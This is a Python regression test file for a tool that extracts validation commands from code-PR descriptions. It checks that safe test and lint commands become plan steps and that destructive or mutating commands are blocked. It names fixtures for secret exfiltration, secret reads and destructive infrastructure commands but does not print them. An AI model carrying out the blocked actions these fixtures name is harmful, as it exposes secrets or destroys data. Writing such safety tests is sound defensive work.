"""代码 PR 脚手架的命令提取与安全边界回归夹具。"""

import importlib.util
import subprocess
import sys
from pathlib import Path
from typing import Callable

from .support import (
    BARE_TESTS_CODE_PR_REQUIREMENT,
    CD_PREFIX_CODE_PR_REQUIREMENT,
    CHAINED_VALIDATION_CODE_PR_REQUIREMENT,
    CI_TABLE_CODE_PR_REQUIREMENT,
    CODE_PR_REQUIREMENT,
    COMMA_SEPARATED_VALIDATION_CODE_PR_REQUIREMENT,
    CROSS_ENV_BACKTICK_CODE_PR_REQUIREMENT,
    CROSS_ENV_CODE_PR_REQUIREMENT,
    CROSS_ENV_RUNNER_WRAPPER_CODE_PR_REQUIREMENT,
    DEFAULT_MUTATING_FORMAT_COMMANDS_CODE_PR_REQUIREMENT,
    DOTENV_WRAPPER_CODE_PR_REQUIREMENT,
    EMOJI_VALIDATION_CODE_PR_REQUIREMENT,
    ENV_COMMAND_CODE_PR_REQUIREMENT,
    ENV_EMPTY_CODE_PR_REQUIREMENT,
    ENV_PREFIX_CODE_PR_REQUIREMENT,
    ENV_UNSET_CODE_PR_REQUIREMENT,
    HYBRID_CHANGED_FILES_CODE_PR_REQUIREMENT,
    INLINE_VALIDATION_CODE_PR_REQUIREMENT,
    LABELED_LIST_CODE_PR_REQUIREMENT,
    LABELED_VALIDATION_CODE_PR_REQUIREMENT,
    MIXED_BACKTICK_BARE_VALIDATION_CODE_PR_REQUIREMENT,
    MIXED_RUNTIME_CODE_PR_REQUIREMENT,
    MIXED_SAFE_UNSAFE_COMMANDS_CODE_PR_REQUIREMENT,
    MULTI_BACKTICK_INLINE_VALIDATION_CODE_PR_REQUIREMENT,
    MUST_RUN_BARE_VALIDATION_CODE_PR_REQUIREMENT,
    NATURAL_LANGUAGE_AND_VALIDATION_CODE_PR_REQUIREMENT,
    PAST_TENSE_VALIDATION_CODE_PR_REQUIREMENT,
    PLAIN_TABLE_CODE_PR_REQUIREMENT,
    PREFIXED_TEST_SECTIONS_CODE_PR_REQUIREMENT,
    PRODUCT_REQUIREMENT_WITH_CODE_PATH,
    PROMPT_VALIDATION_CODE_PR_REQUIREMENT,
    QUALITY_COMMANDS_CODE_PR_REQUIREMENT,
    RUN_WRAPPED_UNSAFE_QUALITY_COMMANDS_CODE_PR_REQUIREMENT,
    SAFE_FORMAT_CHECK_COMMANDS_CODE_PR_REQUIREMENT,
    SINGLE_FILE_CODE_PR_REQUIREMENT,
    TEST_PLAN_CODE_PR_REQUIREMENT,
    TESTED_WITH_BARE_VALIDATION_CODE_PR_REQUIREMENT,
    TESTING_INSTRUCTIONS_CODE_PR_REQUIREMENT,
    UNSAFE_CHAIN_CODE_PR_REQUIREMENT,
    UNSAFE_DATABASE_TOOL_RUNNER_CODE_PR_REQUIREMENT,
    UNSAFE_DD_SECRET_READ_SAFE_GREP_CODE_PR_REQUIREMENT,
    UNSAFE_DEPENDENCY_MUTATION_CODE_PR_REQUIREMENT,
    UNSAFE_DOCKER_CODE_PR_REQUIREMENT,
    UNSAFE_ENV_FILE_SHELL_SECRET_CODE_PR_REQUIREMENT,
    UNSAFE_FIND_XARGS_SECRET_MUTATION_CODE_PR_REQUIREMENT,
    UNSAFE_FRAMEWORK_DATABASE_CODE_PR_REQUIREMENT,
    UNSAFE_INFRA_DESTRUCTIVE_CODE_PR_REQUIREMENT,
    UNSAFE_INLINE_INTERPRETER_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_MAKE_TARGETS_CODE_PR_REQUIREMENT,
    UNSAFE_PACKAGE_SCRIPTS_CODE_PR_REQUIREMENT,
    UNSAFE_PACKAGE_SCRIPTS_WITH_OPTIONS_CODE_PR_REQUIREMENT,
    UNSAFE_QUALITY_COMMANDS_CODE_PR_REQUIREMENT,
    UNSAFE_RELEASE_DESTRUCTIVE_CODE_PR_REQUIREMENT,
    UNSAFE_RUNNER_SHELL_WRAPPED_MUTATION_CODE_PR_REQUIREMENT,
    UNSAFE_SECRET_EXPOSURE_CODE_PR_REQUIREMENT,
    UNSAFE_SECRET_FILE_EXFILTRATION_CODE_PR_REQUIREMENT,
    UNSAFE_SECRET_METADATA_MUTATION_CODE_PR_REQUIREMENT,
    UNSAFE_SECRET_WRITE_SAFE_SED_AWK_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_BACKTICK_SUBSTITUTION_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_COMMAND_SUBSTITUTION_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_CONTROL_FLOW_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_ENV_INDIRECT_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_ENV_STATE_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_INDIRECT_PARAMETER_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_OPERATOR_PUNCTUATION_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_PARAMETER_EXPANSION_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_PIPE_PROCESS_FIND_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_PROCESS_SUBSTITUTION_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_READ_ASSIGNMENT_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_SUBSTITUTION_ASSIGNMENT_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_WRAPPED_INTERPRETER_SECRET_ACCESS_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_WRAPPED_MUTATION_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_WRAPPED_RUBY_SECRET_WRITE_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_WRAPPED_SECRET_READ_CODE_PR_REQUIREMENT,
    UNSAFE_SHELL_XARGS_SECRET_READ_CODE_PR_REQUIREMENT,
    WRAPPED_UNSAFE_QUALITY_COMMANDS_CODE_PR_REQUIREMENT,
    WRAPPER_CODE_PR_REQUIREMENT,
    assert_true,
    load_json,
    run_cmd,
)


def _write_and_run_scaffold(
    script_dir: Path,
    tmp_path: Path,
    requirement: str,
    dirname: str,
) -> Path:
    run_dir = tmp_path / dirname
    run_dir.mkdir(parents=True, exist_ok=True)
    requirement_path = run_dir / "requirement.md"
    requirement_path.write_text(requirement, encoding="utf-8")

    run_cmd(
        [
            sys.executable,
            str(script_dir / "scaffold_requirement.py"),
            "--requirement-file",
            str(requirement_path),
            "--run-dir",
            str(run_dir),
            "--base-url",
            "http://127.0.0.1:9527",
        ],
        cwd=tmp_path,
    )
    return run_dir


def _assert_code_pr_scaffold(
    script_dir: Path,
    tmp_path: Path,
    requirement: str,
    dirname: str,
    expected_file_count: int,
    expected_validation_commands: int,
) -> Path:
    code_pr_dir = _write_and_run_scaffold(script_dir, tmp_path, requirement, dirname)
    summary = load_json(code_pr_dir / "scaffold-summary.json")
    plan = load_json(code_pr_dir / "test-plan.json")
    matrix = load_json(code_pr_dir / "test-matrix.json")
    business_model = load_json(code_pr_dir / "business-model.json")
    steps = [
        step
        for scenario in plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    actions = {step.get("action") for step in steps}
    paths = {step.get("path") for step in steps if step.get("path")}
    test_types = {
        test.get("type")
        for test in matrix.get("tests", [])
        if isinstance(test, dict)
    }

    assert_true(summary.get("scaffold_mode") == "code_pr", "PR body with code paths should use code_pr scaffold mode.")
    assert_true(summary.get("code_file_path_count") == expected_file_count, "code PR scaffold should count code file paths.")
    assert_true(summary.get("validation_command_count") == expected_validation_commands, "code PR scaffold should count validation commands from PR body labels.")
    if expected_validation_commands:
        assert_true(
            len(summary.get("validation_commands") or []) == expected_validation_commands,
            "code PR scaffold summary should list extracted validation commands for auditability.",
        )
    assert_true("goto" not in actions and "api" not in actions, "code PR scaffold must not treat code paths as browser or API routes.")
    assert_true(
        not any(str(path).endswith((".py", ".jsx", ".tsx", ".ts")) for path in paths),
        "code file paths must not appear as executable route paths.",
    )
    assert_true("command" in actions, "code PR scaffold should create safe command/static probes instead of route probes.")
    assert_true("code_pr" in test_types, "code PR scaffold should expose code_pr tests in the matrix.")
    assert_true("api" not in test_types, "code PR scaffold must not create generic API tests from source file paths.")
    validation_steps = [
        step
        for step in steps
        if str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(
        len(validation_steps) == expected_validation_commands,
        "code PR scaffold should create one validation command step per extracted PR command.",
    )
    business_paths = [
        *business_model.get("entry_points", []),
        *business_model.get("api_paths", []),
    ]
    assert_true(
        not any(str(path).endswith((".py", ".jsx", ".tsx", ".ts")) for path in business_paths),
        "code file paths must not appear as business entry points or API paths.",
    )
    return code_pr_dir



def _verify_command_extraction(script_dir: Path, tmp_path: Path) -> None:
    baseline_cases = (
        (CODE_PR_REQUIREMENT, "code-pr-scaffold", 3, 2),
        (SINGLE_FILE_CODE_PR_REQUIREMENT, "single-file-code-pr-scaffold", 1, 1),
        (LABELED_VALIDATION_CODE_PR_REQUIREMENT, "labeled-validation-code-pr-scaffold", 3, 2),
        (BARE_TESTS_CODE_PR_REQUIREMENT, "bare-tests-code-pr-scaffold", 3, 2),
        (TEST_PLAN_CODE_PR_REQUIREMENT, "test-plan-code-pr-scaffold", 2, 2),
        (PROMPT_VALIDATION_CODE_PR_REQUIREMENT, "prompt-validation-code-pr-scaffold", 2, 2),
    )
    for case in baseline_cases:
        _assert_code_pr_scaffold(script_dir, tmp_path, *case)
    env_prefix_dir = _assert_code_pr_scaffold(script_dir, tmp_path, ENV_PREFIX_CODE_PR_REQUIREMENT, "env-prefix-code-pr-scaffold", 2, 2)
    env_prefix_plan = load_json(env_prefix_dir / "test-plan.json")
    env_prefix_steps = [
        step
        for scenario in env_prefix_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(env_prefix_steps[0].get("command", [None])[0] == "pnpm", "env-prefixed pnpm command should not use CI=1 as the executable.")
    assert_true(env_prefix_steps[0].get("env") == {"CI": "1"}, "env-prefixed pnpm command should preserve CI=1 in step env.")
    assert_true(env_prefix_steps[1].get("command", [None])[0] == "npm", "env-prefixed npm command should not use NODE_ENV=test as the executable.")
    assert_true(env_prefix_steps[1].get("env") == {"NODE_ENV": "test"}, "env-prefixed npm command should preserve NODE_ENV=test in step env.")
    env_command_dir = _assert_code_pr_scaffold(script_dir, tmp_path, ENV_COMMAND_CODE_PR_REQUIREMENT, "env-command-code-pr-scaffold", 2, 2)
    env_command_plan = load_json(env_command_dir / "test-plan.json")
    env_command_steps = [
        step
        for scenario in env_command_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(env_command_steps[0].get("command", [None])[0] == "pnpm", "env command wrapped pnpm command should not use env as the executable.")
    assert_true(env_command_steps[0].get("env") == {"CI": "1"}, "env command wrapped pnpm command should preserve CI=1 in step env.")
    assert_true(env_command_steps[1].get("command", [None])[:3] == ["python", "-m", "mypy"], "env command wrapped python module mypy should preserve the nested command.")
    assert_true(env_command_steps[1].get("env") == {"PYTHONPATH": "src"}, "env command wrapped mypy command should preserve PYTHONPATH in step env.")
    env_unset_dir = _assert_code_pr_scaffold(script_dir, tmp_path, ENV_UNSET_CODE_PR_REQUIREMENT, "env-unset-code-pr-scaffold", 3, 2)
    env_unset_plan = load_json(env_unset_dir / "test-plan.json")
    env_unset_steps = [
        step
        for scenario in env_unset_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(env_unset_steps[0].get("command", [])[:4] == ["env", "-u", "NODE_OPTIONS", "pnpm"], "env -u validation command should preserve the safe unset wrapper.")
    assert_true(env_unset_steps[1].get("command", [])[:2] == ["env", "--unset=PYTHONWARNINGS"], "env --unset validation command should preserve the safe unset wrapper.")
    env_empty_dir = _assert_code_pr_scaffold(script_dir, tmp_path, ENV_EMPTY_CODE_PR_REQUIREMENT, "env-empty-code-pr-scaffold", 3, 2)
    env_empty_plan = load_json(env_empty_dir / "test-plan.json")
    env_empty_steps = [
        step
        for scenario in env_empty_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(env_empty_steps[0].get("command", [None])[0] == "pnpm", "empty env assignment should not become the command executable.")
    assert_true(env_empty_steps[0].get("env") == {"CI": ""}, "empty env assignment should preserve CI as an empty string in step env.")
    assert_true(env_empty_steps[1].get("command", [None])[:3] == ["python", "-m", "pytest"], "env -- separator should preserve the nested command.")
    assert_true(env_empty_steps[1].get("env") == {"NODE_ENV": ""}, "env -- separator should preserve NODE_ENV as an empty string in step env.")
    cross_env_dir = _assert_code_pr_scaffold(script_dir, tmp_path, CROSS_ENV_CODE_PR_REQUIREMENT, "cross-env-code-pr-scaffold", 3, 2)
    cross_env_plan = load_json(cross_env_dir / "test-plan.json")
    cross_env_steps = [
        step
        for scenario in cross_env_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(cross_env_steps[0].get("command", [None])[0] == "pnpm", "cross-env wrapped pnpm command should not use cross-env as the executable.")
    assert_true(cross_env_steps[0].get("env") == {"NODE_ENV": "test"}, "cross-env wrapped pnpm command should preserve NODE_ENV in step env.")
    assert_true(cross_env_steps[1].get("command", [None])[:3] == ["python", "-m", "pytest"], "cross-env wrapped python command should preserve the nested command.")
    assert_true(cross_env_steps[1].get("env") == {"PYTHONPATH": "src"}, "cross-env wrapped python command should preserve PYTHONPATH in step env.")
    cross_env_backtick_dir = _assert_code_pr_scaffold(script_dir, tmp_path, CROSS_ENV_BACKTICK_CODE_PR_REQUIREMENT, "cross-env-backtick-code-pr-scaffold", 3, 2)
    cross_env_backtick_plan = load_json(cross_env_backtick_dir / "test-plan.json")
    cross_env_backtick_steps = [
        step
        for scenario in cross_env_backtick_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(cross_env_backtick_steps[0].get("command", [None])[0] == "pnpm", "backticked cross-env wrapped pnpm command should not use cross-env as the executable.")
    assert_true(cross_env_backtick_steps[0].get("env") == {"NODE_ENV": "test"}, "backticked cross-env wrapped pnpm command should preserve NODE_ENV in step env.")
    assert_true(cross_env_backtick_steps[1].get("command", [None])[:3] == ["python", "-m", "pytest"], "backticked cross-env wrapped python command should preserve the nested command.")
    assert_true(cross_env_backtick_steps[1].get("env") == {"PYTHONPATH": "src"}, "backticked cross-env wrapped python command should preserve PYTHONPATH in step env.")
    cross_env_runner_dir = _assert_code_pr_scaffold(script_dir, tmp_path, CROSS_ENV_RUNNER_WRAPPER_CODE_PR_REQUIREMENT, "cross-env-runner-wrapper-code-pr-scaffold", 3, 3)
    cross_env_runner_plan = load_json(cross_env_runner_dir / "test-plan.json")
    cross_env_runner_steps = [
        step
        for scenario in cross_env_runner_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(cross_env_runner_steps[0].get("command", [None])[0] == "pnpm", "npx cross-env wrapped pnpm command should not use npx/cross-env as the executable.")
    assert_true(cross_env_runner_steps[0].get("env") == {"NODE_ENV": "test"}, "npx cross-env wrapped pnpm command should preserve NODE_ENV in step env.")
    assert_true(cross_env_runner_steps[1].get("command", [None])[:2] == ["vitest", "run"], "pnpm exec cross-env wrapped vitest command should preserve the nested command.")
    assert_true(cross_env_runner_steps[1].get("env") == {"NODE_ENV": "test"}, "pnpm exec cross-env wrapped vitest command should preserve NODE_ENV in step env.")
    assert_true(cross_env_runner_steps[2].get("command", [None])[:3] == ["python", "-m", "pytest"], "corepack pnpm exec cross-env wrapped python command should preserve the nested command.")
    assert_true(cross_env_runner_steps[2].get("env") == {"PYTHONPATH": "src"}, "corepack pnpm exec cross-env wrapped python command should preserve PYTHONPATH in step env.")
    dotenv_wrapper_dir = _assert_code_pr_scaffold(script_dir, tmp_path, DOTENV_WRAPPER_CODE_PR_REQUIREMENT, "dotenv-wrapper-code-pr-scaffold", 2, 0)
    dotenv_wrapper_summary = load_json(dotenv_wrapper_dir / "scaffold-summary.json")
    dotenv_wrapper_plan = load_json(dotenv_wrapper_dir / "test-plan.json")
    dotenv_wrapper_steps = [
        step
        for scenario in dotenv_wrapper_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(dotenv_wrapper_summary.get("blocked_validation_command_count") == 9, "dotenv/direnv wrapped validation commands should be modeled as blocked, not silently dropped or truncated.")
    assert_true(dotenv_wrapper_summary.get("blocked_validation_commands") == [
        "dotenv -e .env.test -- pnpm --filter worker test -- retry",
        "npx dotenv -e .env.test -- pnpm --filter worker test -- retry",
        "npx -y dotenv -e .env.test -- pnpm --filter worker test -- retry",
        "npm exec dotenv -e .env.test -- pnpm --filter worker test -- retry",
        "pnpm dlx dotenv -e .env.test -- pnpm --filter worker test -- retry",
        "corepack pnpm dlx dotenv -e .env.test -- pnpm --filter worker test -- retry",
        "corepack yarn dlx dotenv -e .env.test -- pnpm --filter worker test -- retry",
        "corepack npx -y dotenv -e .env.test -- pnpm --filter worker test -- retry",
        "direnv exec . pnpm --filter worker test -- retry",
    ], "blocked dotenv/direnv commands should be listed for auditability.")
    assert_true(not dotenv_wrapper_steps, "dotenv/direnv wrapped validation commands should not create executable command steps before environment boundary approval.")
    cd_prefix_dir = _assert_code_pr_scaffold(script_dir, tmp_path, CD_PREFIX_CODE_PR_REQUIREMENT, "cd-prefix-code-pr-scaffold", 3, 2)
    cd_prefix_plan = load_json(cd_prefix_dir / "test-plan.json")
    cd_prefix_steps = [
        step
        for scenario in cd_prefix_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(cd_prefix_steps[0].get("command", [])[:2] == ["sh", "-lc"], "cd-prefixed validation command should use a shell wrapper instead of cd as the executable.")
    assert_true("cd apps/web && pnpm test -- dashboard" in cd_prefix_steps[0].get("command", ["", "", ""])[2], "cd-prefixed pnpm command should preserve the safe subdirectory command.")
    assert_true(cd_prefix_steps[0].get("cwd") in (None, ""), "cd-prefixed scaffold should not write a cwd that validate_plan resolves relative to the run directory.")
    assert_true(cd_prefix_steps[1].get("command", [])[:2] == ["sh", "-lc"], "cd-prefixed npx command should use a shell wrapper instead of cd as the executable.")
    assert_true("cd apps/web && npx playwright test tests/dashboard.spec.ts" in cd_prefix_steps[1].get("command", ["", "", ""])[2], "cd-prefixed npx command should preserve the safe subdirectory command.")
    wrapper_dir = _assert_code_pr_scaffold(script_dir, tmp_path, WRAPPER_CODE_PR_REQUIREMENT, "wrapper-code-pr-scaffold", 4, 2)
    wrapper_plan = load_json(wrapper_dir / "test-plan.json")
    wrapper_steps = [
        step
        for scenario in wrapper_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(wrapper_steps[0].get("command", [])[:4] == ["docker", "compose", "run", "--rm"], "docker compose run validation command should be preserved as an executable command array.")
    assert_true("pytest" in wrapper_steps[0].get("command", []), "docker compose validation command should keep the nested pytest runner.")
    assert_true(wrapper_steps[1].get("command", [])[:2] == ["corepack", "pnpm"], "corepack pnpm validation command should be preserved as an executable command array.")
    unsafe_docker_dir = _write_and_run_scaffold(script_dir, tmp_path, UNSAFE_DOCKER_CODE_PR_REQUIREMENT, "unsafe-docker-code-pr-scaffold")
    unsafe_docker_summary = load_json(unsafe_docker_dir / "scaffold-summary.json")
    unsafe_docker_plan = load_json(unsafe_docker_dir / "test-plan.json")
    unsafe_docker_steps = [
        step
        for scenario in unsafe_docker_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(unsafe_docker_summary.get("validation_command_count") == 0, "destructive docker compose commands should not be auto-extracted as validation probes.")
    assert_true(not unsafe_docker_steps, "destructive docker compose commands should not create validation command steps.")
    chained_dir = _assert_code_pr_scaffold(script_dir, tmp_path, CHAINED_VALIDATION_CODE_PR_REQUIREMENT, "chained-validation-code-pr-scaffold", 3, 4)
    chained_plan = load_json(chained_dir / "test-plan.json")
    chained_steps = [
        step
        for scenario in chained_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    chained_commands = [step.get("command") for step in chained_steps]
    assert_true(["pnpm", "lint"] in chained_commands, "safe && chains should include the first pnpm command as its own validation step.")
    assert_true(["pnpm", "test", "--", "profile"] in chained_commands, "safe && chains should include the second pnpm command as its own validation step.")
    assert_true(["pnpm", "exec", "playwright", "test", "tests/profile.spec.ts"] in chained_commands, "safe && chains should include the playwright command as its own validation step.")
    assert_true(["pnpm", "typecheck"] in chained_commands, "safe && chains should include the trailing typecheck command as its own validation step.")
    unsafe_chain_dir = _write_and_run_scaffold(script_dir, tmp_path, UNSAFE_CHAIN_CODE_PR_REQUIREMENT, "unsafe-chain-code-pr-scaffold")
    unsafe_chain_summary = load_json(unsafe_chain_dir / "scaffold-summary.json")
    unsafe_chain_plan = load_json(unsafe_chain_dir / "test-plan.json")
    unsafe_chain_steps = [
        step
        for scenario in unsafe_chain_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(unsafe_chain_summary.get("validation_command_count") == 0, "unsafe && chains should not be auto-extracted as validation probes.")
    assert_true(not unsafe_chain_steps, "unsafe && chains should not create validation command steps.")
    testing_instructions_dir = _assert_code_pr_scaffold(script_dir, tmp_path, TESTING_INSTRUCTIONS_CODE_PR_REQUIREMENT, "testing-instructions-code-pr-scaffold", 3, 2)
    testing_instructions_plan = load_json(testing_instructions_dir / "test-plan.json")
    testing_instructions_steps = [
        step
        for scenario in testing_instructions_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    testing_instruction_commands = [step.get("command") for step in testing_instructions_steps]
    assert_true(["pnpm", "--filter", "web", "test", "--", "notifications"] in testing_instruction_commands, "Testing Instructions section should create a pnpm validation step.")
    assert_true(["npx", "playwright", "test", "tests/notifications.spec.ts"] in testing_instruction_commands, "QA section should create an npx playwright validation step.")

    prefixed_sections_dir = _assert_code_pr_scaffold(script_dir, tmp_path, PREFIXED_TEST_SECTIONS_CODE_PR_REQUIREMENT, "prefixed-test-sections-code-pr-scaffold", 4, 3)
    prefixed_sections_plan = load_json(prefixed_sections_dir / "test-plan.json")
    prefixed_sections_steps = [
        step
        for scenario in prefixed_sections_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    prefixed_section_commands = [step.get("command") for step in prefixed_sections_steps]
    assert_true(["pnpm", "--filter", "web", "test", "--", "analytics"] in prefixed_section_commands, "Unit Tests section should create a pnpm validation step.")
    assert_true(["npx", "playwright", "test", "tests/analytics.spec.ts"] in prefixed_section_commands, "E2E Tests section should create an npx playwright validation step.")
    assert_true(["python", "-m", "pytest", "services/api/tests/test_analytics.py"] in prefixed_section_commands, "Manual QA section should create a pytest validation step.")

    ci_table_dir = _assert_code_pr_scaffold(script_dir, tmp_path, CI_TABLE_CODE_PR_REQUIREMENT, "ci-table-code-pr-scaffold", 4, 4)
    ci_table_plan = load_json(ci_table_dir / "test-plan.json")
    ci_table_steps = [
        step
        for scenario in ci_table_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    ci_table_commands = [step.get("command") for step in ci_table_steps]
    assert_true(["pnpm", "--filter", "web", "test", "--", "billing"] in ci_table_commands, "CI section should create a pnpm validation step.")
    assert_true(["python", "-m", "pytest", "services/api/tests/test_billing.py"] in ci_table_commands, "Markdown table Command column should create a pytest validation step.")
    assert_true(["npx", "playwright", "test", "tests/billing.spec.ts"] in ci_table_commands, "Markdown table Command column should create a Playwright validation step.")
    assert_true(["pnpm", "--filter", "web", "typecheck"] in ci_table_commands, "Test Matrix fenced code block should create a typecheck validation step.")

    quality_commands_dir = _assert_code_pr_scaffold(script_dir, tmp_path, QUALITY_COMMANDS_CODE_PR_REQUIREMENT, "quality-commands-code-pr-scaffold", 2, 5)
    quality_commands_plan = load_json(quality_commands_dir / "test-plan.json")
    quality_commands_steps = [
        step
        for scenario in quality_commands_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    quality_commands = [step.get("command") for step in quality_commands_steps]
    assert_true(["ruff", "check", "."] in quality_commands, "Quality Gates section should create a ruff validation step.")
    assert_true(["mypy", "services/api"] in quality_commands, "Quality Gates section should create a mypy validation step.")
    assert_true(["tsc", "--noEmit"] in quality_commands, "Quality Gates section should create a tsc validation step.")
    assert_true(["eslint", "apps/web"] in quality_commands, "Quality Gates section should create an eslint validation step.")
    assert_true(["biome", "check", "apps/web"] in quality_commands, "Quality Gates section should create a biome validation step.")

    unsafe_quality_dir = _write_and_run_scaffold(script_dir, tmp_path, UNSAFE_QUALITY_COMMANDS_CODE_PR_REQUIREMENT, "unsafe-quality-commands-code-pr-scaffold")
    unsafe_quality_summary = load_json(unsafe_quality_dir / "scaffold-summary.json")
    unsafe_quality_plan = load_json(unsafe_quality_dir / "test-plan.json")
    unsafe_quality_steps = [
        step
        for scenario in unsafe_quality_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(unsafe_quality_summary.get("validation_command_count") == 0, "mutating quality commands should not be auto-extracted as validation probes.")
    assert_true(not unsafe_quality_steps, "mutating quality commands should not create validation command steps.")

    wrapped_unsafe_quality_dir = _write_and_run_scaffold(script_dir, tmp_path, WRAPPED_UNSAFE_QUALITY_COMMANDS_CODE_PR_REQUIREMENT, "wrapped-unsafe-quality-commands-code-pr-scaffold")
    wrapped_unsafe_quality_summary = load_json(wrapped_unsafe_quality_dir / "scaffold-summary.json")
    wrapped_unsafe_quality_plan = load_json(wrapped_unsafe_quality_dir / "test-plan.json")
    wrapped_unsafe_quality_steps = [
        step
        for scenario in wrapped_unsafe_quality_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(wrapped_unsafe_quality_summary.get("validation_command_count") == 0, "package-runner wrapped mutating quality commands should not be auto-extracted as validation probes.")
    assert_true(not wrapped_unsafe_quality_steps, "package-runner wrapped mutating quality commands should not create validation command steps.")

    run_wrapped_unsafe_quality_dir = _write_and_run_scaffold(script_dir, tmp_path, RUN_WRAPPED_UNSAFE_QUALITY_COMMANDS_CODE_PR_REQUIREMENT, "run-wrapped-unsafe-quality-commands-code-pr-scaffold")
    run_wrapped_unsafe_quality_summary = load_json(run_wrapped_unsafe_quality_dir / "scaffold-summary.json")
    run_wrapped_unsafe_quality_plan = load_json(run_wrapped_unsafe_quality_dir / "test-plan.json")
    run_wrapped_unsafe_quality_steps = [
        step
        for scenario in run_wrapped_unsafe_quality_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(run_wrapped_unsafe_quality_summary.get("validation_command_count") == 0, "module/tool-runner wrapped mutating quality commands should not be auto-extracted as validation probes.")
    assert_true(not run_wrapped_unsafe_quality_steps, "module/tool-runner wrapped mutating quality commands should not create validation command steps.")

    default_mutating_format_dir = _write_and_run_scaffold(script_dir, tmp_path, DEFAULT_MUTATING_FORMAT_COMMANDS_CODE_PR_REQUIREMENT, "default-mutating-format-commands-code-pr-scaffold")
    default_mutating_format_summary = load_json(default_mutating_format_dir / "scaffold-summary.json")
    default_mutating_format_plan = load_json(default_mutating_format_dir / "test-plan.json")
    default_mutating_format_steps = [
        step
        for scenario in default_mutating_format_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    assert_true(default_mutating_format_summary.get("validation_command_count") == 0, "default-writing format commands should not be auto-extracted as validation probes.")
    assert_true(not default_mutating_format_steps, "default-writing format commands should not create validation command steps.")

    safe_format_check_dir = _assert_code_pr_scaffold(script_dir, tmp_path, SAFE_FORMAT_CHECK_COMMANDS_CODE_PR_REQUIREMENT, "safe-format-check-commands-code-pr-scaffold", 1, 4)
    safe_format_check_plan = load_json(safe_format_check_dir / "test-plan.json")
    safe_format_check_steps = [
        step
        for scenario in safe_format_check_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict) and str(step.get("id") or "").endswith("-validation-command")
    ]
    safe_format_check_commands = [step.get("command") for step in safe_format_check_steps]
    assert_true(["ruff", "format", "--check", "."] in safe_format_check_commands, "ruff format --check should remain a safe validation step.")
    assert_true(["python", "-m", "ruff", "format", "--check", "."] in safe_format_check_commands, "python -m ruff format --check should remain a safe validation step.")
    assert_true(["python", "-m", "black", "--check", "services/api"] in safe_format_check_commands, "python -m black --check should remain a safe validation step.")
    assert_true(["python", "-m", "black", "--diff", "services/api"] in safe_format_check_commands, "python -m black --diff should remain a safe validation step.")

